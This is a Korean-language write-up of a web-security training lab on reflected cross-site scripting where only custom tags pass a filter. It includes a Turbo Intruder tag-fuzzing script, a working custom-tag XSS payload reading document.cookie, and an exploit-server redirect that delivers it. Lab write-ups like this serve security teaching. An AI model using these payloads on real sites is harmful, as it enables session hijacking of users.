# 🚩Lab: Reflected XSS into HTML context with all tags blocked except custom ones

This lab blocks all HTML tags except custom ones.
To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.

### 🔍 분석 및 공격 과정
1. `search`하는 HTTP 요청을 `Turbo intruder`로 전송.
2. 미리 작성해둔 스크립트를 이용하여 허용되는 태그를 퍼징
```html
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                            concurrentConnections=2,
                            requestsPerConnection=50,
                            pipeline=False)
    a = """abbr
a
acronym
address
animate
animatemotion
animatetransform
applet
area
article
aside
audio
b
base
bdi
bdo
big
blink
blockquote
body
br
button
canvas
caption
center
cite
code
col
colgroup
command
content
data
datalist
dd
del
details
dfn
dialog
dir
div
dl
dt
element
em
embed
fieldset
figcaption
figure
font
footer
form
frame
frameset
h1
head
header
hgroup
hr
html
i
iframe
image
img
input
ins
kbd
keygen
label
legend
li
link
listing
main
map
mark
marquee
menu
menuitem
meta
meter
multicol
nav
nextid
nobr
noembed
noframes
noscript
object
ol
optgroup
option
output
p
param
picture
plaintext
pre
progress
q
rb
rp
rt
rtc
ruby
s
samp
script
section
select
set
shadow
slot
small
source
spacer
span
strike
strong
style
sub
summary
sup
svg
table
tbody
td
template
textarea
tfoot
th
thead
time
title
tr
track
tt
u
ul
var
video
wbr
xmp
xss
""".splitlines()

    for tag in a:
        engine.queue(target.req, tag)

def handleResponse(req, interesting):
    table.add(req)
```
3. 확인 결과 커스텀 태그를 허용하고 있음. 그 이후 바로 이어서 사용가능한 이벤트핸들러도 찾아봄. 모두 사용 가능.
4. 다음과 같이 페이로드를 작성.임의의 커스텀태그인 `<xss>`를 사용하고 `tabindex` 속성의 값을 1이상의 양수로 주면 오름차순으로 포커싱됨. 참고로 0을 주면 포커싱을 받을 수 없는 <div>나 <span>도 받을 수 있도록 하고, -1을 주면 그 반대.
```html
<xss id = x onfocus=alert(document.cookie) tabindex=0>
```
5. 요청 url을 `https://0ab0008a03f78e2880d7717100470065.web-security-academy.net/?search=%3Cxss+id+%3D+x+onfocus%3Dalert%28document.cookie%29+tabindex%3D0%3E#x`로 주면 #뒤에 적힌 x로 포커싱되도록 함.
6. 가상의 피해자가 해당 url을 요청하도록 `go to exploit server`에 제출.
```html
<script>
location = 'https://0ab0008a03f78e2880d7717100470065.web-security-academy.net/?search=%3Cxss+id+%3D+x+onfocus%3Dalert%28document.cookie%29+tabindex%3D0%3E#x';
</script>
```
7. solve

### 💡 취약점 원리
 블랙리스트 방식으로 WAF에서 태그를 필터링하고 있기에 custom태그에 대한 방어는 구현되어 있지 않았던 상태.
